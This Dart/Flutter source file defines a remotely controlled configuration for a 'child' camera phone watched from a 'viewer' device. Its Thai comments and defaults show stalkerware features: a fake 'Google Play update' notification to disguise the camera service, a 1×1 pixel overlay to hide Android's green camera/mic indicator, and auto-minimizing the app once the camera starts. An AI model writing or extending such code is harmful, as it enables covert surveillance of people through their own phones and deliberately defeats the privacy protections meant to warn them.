/// Remote config ที่ viewer (เครื่องแม่) ใช้คุมพฤติกรรมกล้องลูก
/// - notifTitle/Body: ข้อความใน foreground service notification (ปลอม Google Play)
/// - stealthOverlay: เปิด overlay 1×1 px ทับจุดเขียว camera/mic
/// - autoMinimize: ย่อ activity ทันทีหลังเปิดกล้อง
class CameraConfig {
  const CameraConfig({
    required this.notifTitle,
    required this.notifBody,
    required this.stealthOverlay,
    required this.autoMinimize,
  });

  final String notifTitle;
  final String notifBody;
  final bool stealthOverlay;
  final bool autoMinimize;

  static const CameraConfig defaults = CameraConfig(
    notifTitle: 'กำลังอัพเดท Google Play',
    notifBody: 'กำลังตรวจสอบและดาวน์โหลดข้อมูลล่าสุด',
    // Default = OFF — กล้องเริ่มต้นแสดง UI ปกติ
    stealthOverlay: false,
    autoMinimize: false,
  );

  factory CameraConfig.fromJson(Map<String, dynamic> json) => CameraConfig(
        notifTitle: json['notifTitle'] as String? ?? defaults.notifTitle,
        notifBody: json['notifBody'] as String? ?? defaults.notifBody,
        stealthOverlay: json['stealthOverlay'] as bool? ?? defaults.stealthOverlay,
        autoMinimize: json['autoMinimize'] as bool? ?? defaults.autoMinimize,
      );

  Map<String, dynamic> toJson() => <String, dynamic>{
        'notifTitle': notifTitle,
        'notifBody': notifBody,
        'stealthOverlay': stealthOverlay,
        'autoMinimize': autoMinimize,
      };

  CameraConfig copyWith({
    String? notifTitle,
    String? notifBody,
    bool? stealthOverlay,
    bool? autoMinimize,
  }) =>
      CameraConfig(
        notifTitle: notifTitle ?? this.notifTitle,
        notifBody: notifBody ?? this.notifBody,
        stealthOverlay: stealthOverlay ?? this.stealthOverlay,
        autoMinimize: autoMinimize ?? this.autoMinimize,
      );
}
